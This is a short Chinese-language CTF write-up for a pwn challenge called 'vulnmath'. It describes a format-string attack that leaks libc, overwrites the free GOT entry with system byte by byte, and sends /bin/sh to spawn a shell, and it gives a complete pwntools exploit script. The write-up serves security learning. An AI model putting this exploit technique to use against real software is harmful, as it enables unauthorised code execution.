### vulnmath

> [附件](./vulnmath)

算是本次比赛比较难的一道题了，没有plt表，通过分析发现输入的buf在heap段，程序又存6次利用格式化字符串漏洞的机会，程序结束前会free掉最开始malloc的chunk 这时利用思路已经有了

1. leak出libc，计算system函数地址
2. 将free函数got表值写成system地址（因为payload有长度限制，所以可以分成4次利用，一次写一个字节）
3. 最后输入/bin/sh，来getshell

[Exploit script:](math.py)

```python
from pwn import *
#context.log_level='debug'

p = process('vulnmath')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
elf = ELF('vulnmath')

p.recvuntil('> ')
p.sendline('%23$p')
p.recvuntil('Incorrect!\n')
base = int(p.recvline(),16)-247-libc.symbols['__libc_start_main']
sys = base + libc.symbols['system']


pay = fmtstr_payload(6,{elf.got['free']:sys&0xff},write_size='int')
p.recvuntil('> ')
p.sendline(pay)

pay = fmtstr_payload(6,{elf.got['free']+1:sys>>8&0xff},write_size='int')
p.recvuntil('> ')
p.sendline(pay)

pay = fmtstr_payload(6,{elf.got['free']+2:sys>>16&0xff},write_size='int')
p.recvuntil('> ')
p.sendline(pay)

pay = fmtstr_payload(6,{elf.got['free']+3:sys>>24&0xff},write_size='int')
p.recvuntil('> ')
p.sendline(pay)

# gdb.attach(p)
p.recvuntil('> ')
p.sendline('/bin/sh\x00')
# gdb.attach(p)
p.interactive()
```

